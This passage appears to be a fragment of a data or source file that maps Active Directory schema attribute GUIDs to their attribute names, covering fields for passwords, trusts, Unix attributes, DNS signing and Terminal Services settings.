	"bf967a15-0de6-11d0-a285-00aa003049e2": "Remote-Source-Type",
	"bf967a14-0de6-11d0-a285-00aa003049e2": "Remote-Source",
	"bf967a12-0de6-11d0-a285-00aa003049e2": "Remote-Server-Name",
	"bf967a10-0de6-11d0-a285-00aa003049e2": "Registered-Address",
	"bf967a0f-0de6-11d0-a285-00aa003049e2": "RDN-Att-ID",
	"bf967a0e-0de6-11d0-a285-00aa003049e2": "RDN",
	"bf967a0d-0de6-11d0-a285-00aa003049e2": "Range-Upper",
	"bf967a0c-0de6-11d0-a285-00aa003049e2": "Range-Lower",
	"7bfdcb86-4807-11d1-a9c3-0000f80367c1": "QueryPoint",
	"e1aea403-cd5b-11d0-afff-0000f80367c1": "Query-Policy-Object",
	"e1aea404-cd5b-11d0-afff-0000f80367c1": "Query-Policy-BL",
	"cbf70a26-7e78-11d2-9921-0000f87a57d4": "Query-Filter",
	"80a67e4e-9f22-11d0-afdd-00c04fd930c9": "Quality-Of-Service",
	"bf967a0b-0de6-11d0-a285-00aa003049e2": "Pwd-Properties",
	"bf967a0a-0de6-11d0-a285-00aa003049e2": "Pwd-Last-Set",
	"bf967a09-0de6-11d0-a285-00aa003049e2": "Pwd-History-Length",
	"b4b54e50-943a-11d1-aebd-0000f80367c1": "Purported-Search",
	"80a67e28-9f22-11d0-afdd-00c04fd930c9": "Public-Key-Policy",
	"bf967a07-0de6-11d0-a285-00aa003049e2": "Proxy-Lifetime",
	"5fd424d6-1262-11d0-a060-00aa006c33ed": "Proxy-Generation-Enabled",
	"bf967a06-0de6-11d0-a285-00aa003049e2": "Proxy-Addresses",
	"e1aea402-cd5b-11d0-afff-0000f80367c1": "Proxied-Object-Name",
	"bf967a05-0de6-11d0-a285-00aa003049e2": "Profile-Path",
	"d9e18317-8939-11d1-aebc-0000f80367c1": "Product-Code",
	"19405b99-3cfa-11d1-a9c0-0000f80367c1": "Privilege-Value",
	"19405b9b-3cfa-11d1-a9c0-0000f80367c1": "Privilege-Holder",
	"19405b98-3cfa-11d1-a9c0-0000f80367c1": "Privilege-Display-Name",
	"19405b9a-3cfa-11d1-a9c0-0000f80367c1": "Privilege-Attributes",
	"bf967a03-0de6-11d0-a285-00aa003049e2": "Private-Key",
	"281416c7-1968-11d0-a28f-00aa003049e2": "Priority",
	"bf967a02-0de6-11d0-a285-00aa003049e2": "Prior-Value",
	"bf967a01-0de6-11d0-a285-00aa003049e2": "Prior-Set-Time",
	"244b296e-5abd-11d0-afd2-00c04fd930c9": "Printer-Name",
	"ba305f6b-47e3-11d0-a1a6-00c04fd930c9": "Print-Status",
	"1f0075fd-7e40-11d0-afd6-00c04fd930c9": "Vol-Table-GUID",
	"7d6c0e9b-7e20-11d0-afd6-00c04fd930c9": "Version-Number-Lo",
	"7d6c0e9a-7e20-11d0-afd6-00c04fd930c9": "Version-Number-Hi",
	"bf967a76-0de6-11d0-a285-00aa003049e2": "Version-Number",
	"281416df-1968-11d0-a28f-00aa003049e2": "Vendor",
	"4d2fa380-7f54-11d2-992a-0000f87a57d4": "Valid-Accesses",
	"167758ad-47f3-11d1-a9c3-0000f80367c1": "USN-Source",
	"bf967a73-0de6-11d0-a285-00aa003049e2": "USN-Last-Obj-Rem",
	"a8df7498-c5ea-11d1-bbcb-0080c76670c0": "USN-Intersite",
	"bf967a71-0de6-11d0-a285-00aa003049e2": "USN-DSA-Last-Obj-Removed",
	"bf967a70-0de6-11d0-a285-00aa003049e2": "USN-Created",
	"bf967a6f-0de6-11d0-a285-00aa003049e2": "USN-Changed",
	"bf9679d7-0de6-11d0-a285-00aa003049e2": "User-Workstations",
	"e16a9db2-403c-11d1-a9c0-0000f80367c1": "User-SMIME-Certificate",
	"9a9a0220-4a5b-11d1-a9c3-0000f80367c1": "User-Shared-Folder-Other",
	"9a9a021f-4a5b-11d1-a9c3-0000f80367c1": "User-Shared-Folder",
	"28630ebb-41d5-11d1-a9c1-0000f80367c1": "User-Principal-Name",
	"23998ab5-70f8-4007-a4c1-a84a38311f9a": "userPKCS12",
	"11732a8a-e14d-4cc5-b92f-d93f51c6d8e4": "userClass",
	"bf967a6e-0de6-11d0-a285-00aa003049e2": "User-Password",
	"bf967a6d-0de6-11d0-a285-00aa003049e2": "User-Parameters",
	"bf967a6a-0de6-11d0-a285-00aa003049e2": "User-Comment",
	"bf967a69-0de6-11d0-a285-00aa003049e2": "User-Cert",
	"bf967a68-0de6-11d0-a285-00aa003049e2": "User-Account-Control",
	"032160bf-9824-11d1-aec0-0000f80367c1": "UPN-Suffixes",
	"d9e18312-8939-11d1-aebc-0000f80367c1": "Upgrade-Product-Code",
	"9c8ef177-41cf-45c9-9673-7716c0c8901b": "unstructuredName",
	"50950839-cc4c-4491-863a-fcf942d684b7": "unstructuredAddress",
	"8f888726-f80a-44d7-b1ee-cb9df21392c8": "uniqueMember",
	"ba0184c7-38c5-4bed-a526-75421470580c": "uniqueIdentifier",
	"bf9679e1-0de6-11d0-a285-00aa003049e2": "Unicode-Pwd",
	"bf967a64-0de6-11d0-a285-00aa003049e2": "UNC-Name",
	"0bb0fca0-1e89-429f-901a-1413894d9f59": "uid",
	"bf967a61-0de6-11d0-a285-00aa003049e2": "UAS-Compat",
	"bf967a60-0de6-11d0-a285-00aa003049e2": "Trust-Type",
	"bf967a5e-0de6-11d0-a285-00aa003049e2": "Trust-Posix-Offset",
	"bf967a5d-0de6-11d0-a285-00aa003049e2": "Trust-Partner",
	"b000ea7a-a086-11d0-afdd-00c04fd930c9": "Trust-Parent",
	"bf967a5c-0de6-11d0-a285-00aa003049e2": "Trust-Direction",
	"bf967a5f-0de6-11d0-a285-00aa003049e2": "Trust-Auth-Outgoing",
	"bf967a59-0de6-11d0-a285-00aa003049e2": "Trust-Auth-Incoming",
	"80a67e5a-9f22-11d0-afdd-00c04fd930c9": "Trust-Attributes",
	"28630ebd-41d5-11d1-a9c1-0000f80367c1": "Tree-Name",
	"8fd044e3-771f-11d1-aeae-0000f80367c1": "Treat-As-Leaf",
	"26d97374-6070-11d1-a9c6-0000f80367c1": "Transport-Type",
	"26d97372-6070-11d1-a9c6-0000f80367c1": "Transport-DLL-Name",
	"c1dc867c-a261-11d1-b606-0000f80367c1": "Transport-Address-Attribute",
	"16c3a860-1273-11d0-a060-00aa006c33ed": "Tombstone-Lifetime",
	"bf967a55-0de6-11d0-a285-00aa003049e2": "Title",
	"ddac0cf0-af8f-11d0-afeb-00c04fd930c9": "Time-Vol-Change",
	"ddac0cf1-af8f-11d0-afeb-00c04fd930c9": "Time-Refresh",
	"a8df7489-c5ea-11d1-bbcb-0080c76670c0": "Text-Encoded-OR-Address",
	"f0f8ffa7-1191-11d0-a060-00aa006c33ed": "Text-Country",
	"6db69a1c-9422-11d1-aebd-0000f80367c1": "Terminal-Server",
	"ed9de9a0-7041-11d2-9905-0000f87a57d4": "Template-Roots",
	"0296c121-40da-11d1-a9c0-0000f80367c1": "Telex-Primary",
	"bf967a4b-0de6-11d0-a285-00aa003049e2": "Telex-Number",
	"bf967a4a-0de6-11d0-a285-00aa003049e2": "Teletex-Terminal-Identifier",
	"bf967a49-0de6-11d0-a285-00aa003049e2": "Telephone-Number",
	"bf967a47-0de6-11d0-a285-00aa003049e2": "System-Poss-Superiors",
	"bf967a46-0de6-11d0-a285-00aa003049e2": "System-Only",
	"bf967a45-0de6-11d0-a285-00aa003049e2": "System-Must-Contain",
	"bf967a44-0de6-11d0-a285-00aa003049e2": "System-May-Contain",
	"e0fa1e62-9b45-11d0-afdd-00c04fd930c9": "System-Flags",
	"bf967a43-0de6-11d0-a285-00aa003049e2": "System-Auxiliary-Class",
	"037651e5-441d-11d1-a9c3-0000f80367c1": "Sync-With-SID",
	"037651e2-441d-11d1-a9c3-0000f80367c1": "Sync-With-Object",
	"037651e3-441d-11d1-a9c3-0000f80367c1": "Sync-Membership",
	"037651e4-441d-11d1-a9c3-0000f80367c1": "Sync-Attributes",
	"bf967a41-0de6-11d0-a285-00aa003049e2": "Surname",
	"1677588f-47f3-11d1-a9c3-0000f80367c1": "Supported-Application-Context",
	"bf967a3f-0de6-11d0-a285-00aa003049e2": "Supplemental-Credentials",
	"5245801d-ca6a-11d0-afff-0000f80367c1": "Superior-DNS-Root",
	"963d274b-48be-11d1-a9c3-0000f80367c1": "Super-Scopes",
	"963d274c-48be-11d1-a9c3-0000f80367c1": "Super-Scope-Description",
	"9a7ad94d-ca53-11d1-bbd0-0080c76670c0": "SubSchemaSubEntry",
	"bf967a3c-0de6-11d0-a285-00aa003049e2": "Sub-Refs",
	"bf967a3b-0de6-11d0-a285-00aa003049e2": "Sub-Class-Of",
	"3860949f-f6a8-4b38-9950-81ecb6bc2982": "Structural-Object-Class",
	"bf967a3a-0de6-11d0-a285-00aa003049e2": "Street-Address",
	"bf967a39-0de6-11d0-a285-00aa003049e2": "State-Or-Province-Name",
	"2ab0e76c-7041-11d2-9905-0000f87a57d4": "SPN-Mappings",
	"26d9736f-6070-11d1-a9c6-0000f80367c1": "SMTP-Mail-Address",
	"1be8f17c-a9ff-11d0-afe2-00c04fd930c9": "Site-Server",
	"3e10944d-c354-11d0-aff8-0000f80367c1": "Site-Object-BL",
	"3e10944c-c354-11d0-aff8-0000f80367c1": "Site-Object",
	"d50c2cdc-8951-11d1-aebc-0000f80367c1": "Site-List",
	"d50c2cdd-8951-11d1-aebc-0000f80367c1": "Site-Link-List",
	"3e978924-8c01-11d0-afda-00c04fd930c9": "Site-GUID",
	"2a39c5b2-8960-11d1-aebc-0000f80367c1": "Signature-Algorithms",
	"17eb4278-d167-11d0-b002-0000f80367c1": "SID-History",
	"bf967984-0de6-11d0-a285-00aa003049e2": "Show-In-Advanced-View-Only",
	"3e74f60e-3e73-11d1-a9c0-0000f80367c1": "Show-In-Address-Book",
	"45b01501-c419-11d1-bbc9-0080c76670c0": "Short-Server-Name",
	"52458039-ca6a-11d0-afff-0000f80367c1": "Shell-Property-Pages",
	"553fd039-f32e-11d0-b0bc-00c04fd8dca6": "Shell-Context-Menu",
	"7d6c0e97-7e20-11d0-afd6-00c04fd930c9": "Setup-Command",
	"f3a64788-5306-11d1-a9c5-0000f80367c1": "Service-Principal-Name",
	"bf967a37-0de6-11d0-a285-00aa003049e2": "Service-Instance-Version",
	"28630eba-41d5-11d1-a9c1-0000f80367c1": "Service-DNS-Name-Type",
	"f7a3b6a0-2107-4140-b306-75cb521731e5": "MS-TS-ManagingLS4",
	"fad5dcc1-2130-4c87-a118-75322cd67050": "MS-TS-ManagingLS3",
	"349f0757-51bd-4fc8-9d66-3eceea8a25be": "MS-TS-ManagingLS2",
	"f3bcc547-85b0-432c-9ac0-304506bf2c83": "MS-TS-ManagingLS",
	"70ca5d97-2304-490a-8a27-52678c8d2095": "MS-TS-LicenseVersion4",
	"f8ba8f81-4cab-4973-a3c8-3a6da62a5e31": "MS-TS-LicenseVersion3",
	"4b0df103-8d97-45d9-ad69-85c3080ba4e7": "MS-TS-LicenseVersion2",
	"0ae94a89-372f-4df2-ae8a-c64a2bc47278": "MS-TS-LicenseVersion",
	"5e11dc43-204a-4faf-a008-6863621c6f5f": "MS-TS-ExpireDate4",
	"41bc7f04-be72-4930-bd10-1f3439412387": "MS-TS-ExpireDate3",
	"54dfcf71-bc3f-4f0b-9d5a-4b2476bb8925": "MS-TS-ExpireDate2",
	"70004ef5-25c3-446a-97c8-996ae8566776": "MS-TS-ExpireDate",
	"3586f6ac-51b7-4978-ab42-f936463198e7": "MS-TS-Property02",
	"faaea977-9655-49d7-853d-f27bb7aaca0f": "MS-TS-Property01",
	"34b107af-a00a-455a-b139-dd1a1b12d8af": "ms-TS-Secondary-Desktop-BL",
	"9daadc18-40d1-4ed1-a2bf-6b9bf47d3daa": "ms-TS-Primary-Desktop-BL",
	"f63aa29a-bb31-48e1-bfab-0a6c5a1d39c2": "ms-TS-Secondary-Desktops",
	"29259694-09e4-4237-9f72-9306ebe63ab2": "ms-TS-Primary-Desktop",
	"3c08b569-801f-4158-b17b-e363d6ae696a": "ms-TS-Endpoint-Plugin",
	"377ade80-e2d8-46c5-9bcd-6d9dec93b35e": "ms-TS-Endpoint-Type",
	"40e1c407-4344-40f3-ab43-3625a34a63a2": "ms-TS-Endpoint-Data",
	"9201ac6f-1d69-4dfb-802e-d95510109599": "ms-TS-Initial-Program",
	"a744f666-3d3c-4cc8-834b-9d4f6f687b8b": "ms-TS-Work-Directory",
	"c0ffe2bd-cacf-4dc7-88d5-61e9e95766f6": "ms-TS-Default-To-Main-Printer",
	"8ce6a937-871b-4c92-b285-d99d4036681c": "ms-TS-Connect-Printer-Drives",
	"23572aaf-29dd-44ea-b0fa-7e8438b9a4a3": "ms-TS-Connect-Client-Drives",
	"1cf41bba-5604-463e-94d6-1a1287b72ca3": "ms-TS-Broken-Connection-Action",
	"366ed7ca-3e18-4c7f-abae-351a01e4b4f7": "ms-TS-Reconnection-Action",
	"ff739e9c-6bb7-460e-b221-e250f3de0f95": "ms-TS-Max-Idle-Time",
	"1d960ee2-6464-4e95-a781-e3b5cd5f9588": "ms-TS-Max-Connection-Time",
	"326f7089-53d8-4784-b814-46d8535110d2": "ms-TS-Max-Disconnection-Time",
	"15177226-8642-468b-8c48-03ddfd004982": "ms-TS-Remote-Control",
	"3a0cd464-bc54-40e7-93ae-a646a6ecc4b4": "ms-TS-Allow-Logon",
	"5f0a24d9-dffa-4cd9-acbf-a0680c03731e": "ms-TS-Home-Drive",
	"5d3510f0-c4e7-4122-b91f-a20add90e246": "ms-TS-Home-Directory",
	"e65c30db-316c-4060-a3a0-387b083f09cd": "ms-TS-Profile-Path",
	"4503d2a3-3d70-41b8-b077-dff123c15865": "msSFU-30-Crypt-Method",
	"0dea42f5-278d-4157-b4a7-49b59664915b": "msSFU-30-Is-Valid-Container",
	"a9e84eed-e630-4b67-b4b3-cad2a82d345e": "msSFU-30-Netgroup-User-At-Domain",
	"97d2bf65-0466-4852-a25a-ec20f57ee36c": "msSFU-30-Netgroup-Host-At-Domain",
	"7bd76b92-3244-438a-ada6-24f5ea34381e": "msSFU-30-Posix-Member-Of",
	"c875d82d-2848-4cec-bb50-3c5486d09d57": "msSFU-30-Posix-Member",
	"585c9d5e-f599-4f07-9cf9-4373af4b89d3": "msSFU-30-NSMAP-Field-Position",
	"ec998437-d944-4a28-8500-217588adfc75": "msSFU-30-Max-Uid-Number",
	"04ee6aa6-f83b-469a-bf5a-3c00d3634669": "msSFU-30-Max-Gid-Number",
	"084a944b-e150-4bfe-9345-40e1aedaebba": "msSFU-30-Yp-Servers",
	"93095ed3-6f30-4bdd-b734-65d569f5f7c9": "msSFU-30-Domains",
	"9ee3b2e3-c7f3-45f8-8c9f-1382be4984d2": "msSFU-30-Nis-Domain",
	"37830235-e5e9-46f2-922b-d8d44f03e7ae": "msSFU-30-Key-Values",
	"20ebf171-c69a-4c31-b29d-dcb837d8912d": "msSFU-30-Aliases",
	"16c5d1d3-35c2-4061-a870-a5cefda804f0": "msSFU-30-Name",
	"02625f05-d1ee-4f9f-b366-55266becb95c": "msSFU-30-Order-Number",
	"4cc908a2-9e18-410e-8459-f17cc422020a": "msSFU-30-Master-Server-Name",
	"b7b16e01-024f-4e23-ad0d-71f1a406b684": "msSFU-30-Map-Filter",
	"e167b0b6-4045-4433-ac35-53f972d45cba": "msSFU-30-Result-Attributes",
	"ef9a2df0-2e57-48c8-8950-0cc674004733": "msSFU-30-Search-Attributes",
	"95b2aef0-27e4-4cb9-880a-a2d9a9ea23b8": "msSFU-30-Intra-Field-Separator",
	"a2e11a42-e781-4ca1-a7fa-ec307f62b6a1": "msSFU-30-Field-Separator",
	"32ecd698-ce9e-4894-a134-7ad76b082e83": "msSFU-30-Key-Attributes",
	"27eebfa2-fbeb-4f8e-aad6-c50247994291": "msSFU-30-Search-Container",
	"4a95216e-fcc0-402e-b57f-5971626148a9": "NisMapEntry",
	"969d3c79-0e9a-4d95-b0ac-bdde7ff8f3a1": "NisMapName",
	"e3f3cb4e-0f20-42eb-9703-d2ff26e52667": "BootFile",
	"d72a0750-8c7c-416e-8714-e65f11e908be": "BootParameter",
	"e6a522dd-9770-43e1-89de-1de5044328f7": "MacAddress",
	"6ff64fcd-462e-4f62-b44a-9a5347659eb9": "IpNetmaskNumber",
	"4e3854f4-3087-42a4-a813-bb0c528958d3": "IpNetworkNumber",
	"de8bb721-85dc-4fde-b687-9657688e667e": "IpHostNumber",
	"966825f5-01d9-4a5c-a011-d15ae84efa55": "OncRpcNumber",
	"ebf5c6eb-0e2d-4415-9670-1081993b4211": "IpProtocolNumber",
	"cd96ec0b-1ed6-43b4-b26b-f170b645883f": "IpServiceProtocol",
	"ff2daebf-f463-495a-8405-3e483641eaa2": "IpServicePort",
	"a8032e74-30ef-4ff5-affc-0fc217783fec": "NisNetgroupTriple",
	"0f6a17dc-53e5-4be8-9442-8f3ce2f9012a": "MemberNisNetgroup",
	"03dab236-672e-4f61-ab64-f77d2dc2ffab": "MemberUid",
	"8dfeb70d-c5db-46b6-b15e-a4389e6cee9b": "ShadowFlag",
	"75159a00-1fff-4cf4-8bff-4ef2695cf643": "ShadowExpire",
	"86871d1f-3310-4312-8efd-af49dcfb2671": "ShadowInactive",
	"7ae89c9c-2976-4a46-bb8a-340f88560117": "ShadowWarning",
	"f285c952-50dd-449e-9160-3b880d99988d": "ShadowMax",
	"a76b8737-e5a1-4568-b057-dc12e04be4b2": "ShadowMin",
	"f8f2689c-29e8-4843-8177-e8b98e15eeac": "ShadowLastChange",
	"a553d12c-3231-4c5e-8adf-8d189697721e": "LoginShell",
	"bc2dba12-000f-464d-bf1d-0808465d8843": "UnixHomeDirectory",
	"a3e03f1f-1d55-4253-a0af-30c2a784e46e": "Gecos",
	"c5b95f0c-ec9e-41c4-849c-b46597ed6696": "GidNumber",
	"850fcc8f-9c6b-47e1-b671-7c654be4d5b3": "UidNumber",
	"612cb747-c0e8-4f92-9221-fdd5f15b550d": "UnixUserPassword",
	"bf967a7f-0de6-11d0-a285-00aa003049e2": "X509-Cert",
	"d07da11f-8a3d-42b6-b0aa-76c962be719a": "x500uniqueIdentifier",
	"bf967a7b-0de6-11d0-a285-00aa003049e2": "X121-Address",
	"9a9a0221-4a5b-11d1-a9c3-0000f80367c1": "WWW-Page-Other",
	"bf967a7a-0de6-11d0-a285-00aa003049e2": "WWW-Home-Page",
	"bf967a79-0de6-11d0-a285-00aa003049e2": "Winsock-Addresses",
	"bf967a78-0de6-11d0-a285-00aa003049e2": "When-Created",
	"bf967a77-0de6-11d0-a285-00aa003049e2": "When-Changed",
	"05308983-7688-11d1-aded-00c04fd8d5cd": "Well-Known-Objects",
	"244b2970-5abd-11d0-afd2-00c04fd930c9": "Wbem-Path",
	"34aaa217-b699-11d0-afee-0000f80367c1": "Volume-Count",
	"1f0075fb-7e40-11d0-afd6-00c04fd930c9": "Vol-Table-Idx-GUID",
	"f8758ef7-ac76-8843-a2ee-a26b4dcaf409": "ms-DS-ManagedPasswordInterval",
	"d0d62131-2d4a-d04f-99d9-1c63646229a4": "ms-DS-ManagedPasswordPreviousId",
	"0e78295a-c6d3-0a40-b491-d62251ffa0a6": "ms-DS-ManagedPasswordId",
	"e362ed86-b728-0842-b27d-2dea7a9df218": "ms-DS-ManagedPassword",
	"3f78c3e5-f79a-46bd-a0b8-9d18116ddc79": "ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity",
	"8ae70db5-6406-4196-92fe-f3bb557520a7": "ms-Imaging-Hash-Algorithm",
	"9cdfdbc5-0304-4569-95f6-c4f663fe5ae6": "ms-Imaging-Thumbprint-Hash",
	"ae18119f-6390-0045-b32d-97dbc701aef7": "ms-Kds-CreateTime",
	"6cdc047f-f522-b74a-9a9c-d95ac8cdfda2": "ms-Kds-UseStartTime",
	"96400482-cf07-e94c-90e8-f2efc4f0495e": "ms-Kds-DomainID",
	"d5f07340-e6b0-1e4a-97be-0d3318bd9db1": "ms-Kds-Version",
	"26627c27-08a2-0a40-a1b1-8dce85b42993": "ms-Kds-RootKeyData",
	"615f42a1-37e7-1148-a0dd-3007e09cfc81": "ms-Kds-PrivateKey-Length",
	"e338f470-39cd-4549-ab5b-f69f9e583fe0": "ms-Kds-PublicKey-Length",
	"30b099d9-edfe-7549-b807-eba444da79e9": "ms-Kds-SecretAgreement-Param",
	"1702975d-225e-cb4a-b15d-0daea8b5e990": "ms-Kds-SecretAgreement-AlgorithmID",
	"8a800772-f4b8-154f-b41c-2e4271eff7a7": "ms-Kds-KDF-Param",
	"db2c48b2-d14d-ec4e-9f58-ad579d8b440e": "ms-Kds-KDF-AlgorithmID",
	"998c06ac-3f87-444e-a5df-11b03dc8a50c": "ms-DS-Is-Primary-Computer-For",
	"a13df4e2-dbb0-4ceb-828b-8b2e143e9e81": "ms-DS-Primary-Computer",
	"1e5d393d-8cb7-4b4f-840a-973b36cc09c3": "ms-DS-Generation-Id",
	"cd789fb9-96b4-4648-8219-ca378161af38": "ms-DS-Claim-Is-Single-Valued",
	"0c2ce4c7-f1c3-4482-8578-c60d4bb74422": "ms-DS-Claim-Is-Value-Space-Restricted",
	"92f19c05-8dfa-4222-bbd1-2c4f01487754": "ms-DS-Claim-Source-Type",
	"fa32f2a6-f28b-47d0-bf91-663e8f910a72": "ms-DS-Claim-Source",
	"516e67cf-fedd-4494-bb3a-bc506a948891": "ms-Authz-Member-Rules-In-Central-Access-Policy-BL",
	"57f22f7a-377e-42c3-9872-cec6f21d2e3e": "ms-Authz-Member-Rules-In-Central-Access-Policy",
	"62f29b60-be74-4630-9456-2f6691993a86": "ms-Authz-Central-Access-Policy-ID",
	"80997877-f874-4c68-864d-6e508a83bdbd": "ms-Authz-Resource-Condition",
	"8e1685c6-3e2f-48a2-a58d-5af0ea789fa0": "ms-Authz-Last-Effective-Security-Policy",
	"b946bece-09b5-4b6a-b25a-4b63a330e80e": "ms-Authz-Proposed-Security-Policy",
	"07831919-8f94-4fb6-8a42-91545dccdad3": "ms-Authz-Effective-Security-Policy",
	"387d9432-a6d1-4474-82cd-0a89aae084ae": "ms-DNS-NSEC3-Current-Salt",
	"aff16770-9622-4fbc-a128-3088777605b9": "ms-DNS-NSEC3-User-Salt",
	"ba340d47-2181-4ca0-a2f6-fae4479dab2a": "ms-DNS-Propagation-Time",
	"285c6964-c11a-499e-96d8-bf7c75a223c6": "ms-DNS-Parent-Has-Secure-Delegation",
	"28c458f5-602d-4ac9-a77c-b3f1be503a7e": "ms-DNS-DNSKEY-Records",
	"b7673e6d-cad9-4e9e-b31a-63e8098fdd63": "ms-DNS-Signing-Keys",
	"3443d8cd-e5b6-4f3b-b098-659a0214a079": "ms-DNS-Signing-Key-Descriptors",
	"f6b0f0be-a8e4-4468-8fd9-c3c47b8722f9": "ms-DNS-Secure-Delegation-Polling-Period",
	"03d4c32e-e217-4a61-9699-7bbc4729a026": "ms-DNS-Signature-Inception-Offset",
	"29869b7c-64c4-42fe-97d5-fbc2fa124160": "ms-DNS-DS-Record-Set-TTL",
	"8f4e317f-28d7-442c-a6df-1f491f97b326": "ms-DNS-DNSKEY-Record-Set-TTL",
	"80b70aab-8959-4ec0-8e93-126e76df3aca": "ms-DNS-NSEC3-Iterations",
	"13361665-916c-4de7-a59d-b1ebbd0de129": "ms-DNS-NSEC3-Random-Salt-Length",
	"ff9e5552-7db7-4138-8888-05ce320a0323": "ms-DNS-NSEC3-Hash-Algorithm",
	"27d93c40-065a-43c0-bdd8-cdf2c7d120aa": "ms-DNS-RFC5011-Key-Rollovers",
	"5c5b7ad2-20fa-44bb-beb3-34b9c0f65579": "ms-DNS-DS-Record-Algorithms",
	"0dc063c1-52d9-4456-9e15-9c2434aafd94": "ms-DNS-Maintain-Trust-Anchor",
	"7bea2088-8ce2-423c-b191-66ec506b1595": "ms-DNS-NSEC3-OptOut",
	"c79f2199-6da1-46ff-923c-1f3f800c721e": "ms-DNS-Sign-With-NSEC3",
	"aa12854c-d8fc-4d5e-91ca-368b8d829bee": "ms-DNS-Is-Signed",
	"0be0dd3b-041a-418c-ace9-2f17d23e9d42": "ms-DNS-Keymaster-Zones",
	"14fa84c9-8ecd-4348-bc91-6d3ced472ab7": "ms-TPM-Tpm-Information-For-Computer-BL",
	"ea1b7b93-5e48-46d5-bc6c-4df4fda78a35": "ms-TPM-Tpm-Information-For-Computer",
	"c894809d-b513-4ff8-8811-f4f43f5ac7bc": "ms-TPM-Owner-Information-Temp",
	"19d706eb-4d76-44a2-85d6-1c342be3be37": "ms-TPM-Srk-Pub-Thumbprint",
	"1075b3a1-bbaf-49d2-ae8d-c4f25c823303": "ms-SPP-Issuance-License",
	"0353c4b5-d199-40b0-b3c5-deb32fd9ec06": "ms-SPP-Config-License",
	"67e4d912-f362-4052-8c79-42f45ba7b221": "ms-SPP-Phone-License",
	"098f368e-4812-48cd-afb7-a136b96807ed": "ms-SPP-Online-License",
	"6e8797c4-acda-4a49-8740-b0bd05a9b831": "ms-SPP-Confirmation-Id",
	"69bfb114-407b-4739-a213-c663802b3e37": "ms-SPP-Installation-Id",
	"9b663eda-3542-46d6-9df0-314025af2bac": "ms-SPP-KMS-Ids",
	"9684f739-7b78-476d-8d74-31ad7692eef4": "ms-SPP-CSVLK-Sku-Id",
	"a601b091-8652-453a-b386-87ad239b7c08": "ms-SPP-CSVLK-Partial-Product-Key",
	"b47f510d-6b50-47e1-b556-772c79e4ffc4": "ms-SPP-CSVLK-Pid",
	"7469b704-edb0-4568-a5a5-59f4862c75a7": "ms-DS-Members-Of-Resource-Property-List-BL",
	"4d371c11-4cad-4c41-8ad2-b180ab2bd13c": "ms-DS-Members-Of-Resource-Property-List",
	"54d522db-ec95-48f5-9bbd-1880ebbb2180": "ms-DS-Claim-Shares-Possible-Values-With-BL",
	"52c8d13a-ce0b-4f57-892b-18f5a43a2400": "ms-DS-Claim-Shares-Possible-Values-With",
	"6afb0e4c-d876-437c-aeb6-c3e41454c272": "ms-DS-Claim-Type-Applies-To-Class",
	"eebc123e-bae6-4166-9e5b-29884a8b76b0": "ms-DS-Claim-Attribute-Source",
	"c66217b9-e48e-47f7-b7d5-6552b8afd619": "ms-DS-Claim-Value-Type",
	"2e28edee-ed7c-453f-afe4-93bd86f2174f": "ms-DS-Claim-Possible-Values",
	"51c9f89d-4730-468d-a2b5-1d493212d17e": "ms-DS-Is-Used-As-Resource-Security-Attribute",
	"3ced1465-7b71-2541-8780-1e1ea6243a82": "ms-DS-BridgeHead-Servers-Used",
	"ea944d31-864a-4349-ada5-062e2c614f5e": "ms-DFS-Ttl-v2",
	"6ab126c6-fa41-4b36-809e-7ca91610d48f": "ms-DFS-Target-List-v2",
	"2d7826f0-4cf7-42e9-a039-1110e0d9ca99": "ms-DFS-Short-Name-Link-Path-v2",
	"fef9a725-e8f1-43ab-bd86-6a0115ce9e38": "ms-DFS-Schema-Minor-Version",
	"ec6d7855-704a-4f61-9aa6-c49a7c1d54c7": "ms-DFS-Schema-Major-Version",
	"0c3e5bc5-eb0e-40f5-9b53-334e958dffdb": "ms-DFS-Properties-v2",
	"200432ce-ec5f-4931-a525-d7f4afe34e68": "ms-DFS-Namespace-Identity-GUID-v2",
	"57cf87f7-3426-4841-b322-02b3b6e9eba8": "ms-DFS-Link-Security-Descriptor-v2",
	"86b021f6-10ab-40a2-a252-1dc0cc3be6a9": "ms-DFS-Link-Path-v2",
	"edb027f3-5726-4dee-8d4e-dbf07e1ad1f1": "ms-DFS-Link-Identity-GUID-v2",
	"3c095e8a-314e-465b-83f5-ab8277bcf29b": "ms-DFS-Last-Modified-v2",
	"35b8b3d9-c58f-43d6-930e-5040f2f1a781": "ms-DFS-Generation-GUID-v2",
	"b786cec9-61fd-4523-b2c1-5ceb3860bb32": "ms-DFS-Comment-v2",
	"d64b9c23-e1fa-467b-b317-6964d744d633": "ms-DFSR-StagingCleanupTriggerInPercent",
	"135eb00e-4846-458b-8ea2-a37559afd405": "ms-DFSR-CommonStagingSizeInMb",
	"936eac41-d257-4bb9-bd55-f310a3cf09ad": "ms-DFSR-CommonStagingPath",
	"11e24318-4ca6-4f49-9afe-e5eb1afa3473": "ms-DFSR-Options2",
	"7d523aff-9012-49b2-9925-f922a0018656": "ms-DFSR-OnDemandExclusionDirectoryFilter",
	"a68359dc-a581-4ee6-9015-5382c60f0fb4": "ms-DFSR-OnDemandExclusionFileFilter",
	"87811bd5-cd8b-45cb-9f5d-980f3a9e0c97": "ms-DFSR-DefaultCompressionExclusionFilter",
	"6a84ede5-741e-43fd-9dd6-aa0f61578621": "ms-DFSR-DisablePacketPrivacy",
	"47c77bb0-316e-4e2f-97f1-0d4c48fca9dd": "MS-TSLS-Property02",
	"87e53590-971d-4a52-955b-4794d15a84ae": "MS-TSLS-Property01",
	"b002f407-1340-41eb-bca0-bd7d938e25a9": "ms-DS-Source-Anchor",
	"aacd2170-482a-44c6-b66e-42c2f66a285c": "ms-DS-Strong-NTLM-Policy",
	"278947b9-5222-435e-96b7-1503858c2b48": "ms-DS-Service-Allowed-NTLM-Network-Authentication",
	"7ece040f-9327-4cdc-aad3-037adfe62639": "ms-DS-User-Allowed-NTLM-Network-Authentication",
	"3417ab48-df24-4fb1-80b0-0fcb367e25e3": "ms-DS-Expire-Passwords-On-Smart-Card-Only-Accounts",
	"938ad788-225f-4eee-93b9-ad24a159e1db": "ms-DS-Key-Credential-Link-BL",
	"5b47d60f-6090-40b2-9f37-2a4de88f3063": "ms-DS-Key-Credential-Link",
	"1dcc0722-aab0-4fef-956f-276fe19de107": "ms-DS-Shadow-Principal-Sid",
	"c4a46807-6adc-4bbb-97de-6bed181a1bfe": "ms-DS-Device-Trust-Type",
	"649ac98d-9b9a-4d41-af6b-f616f2a62e4a": "ms-DS-Key-Approximate-Last-Logon-Time-Stamp",
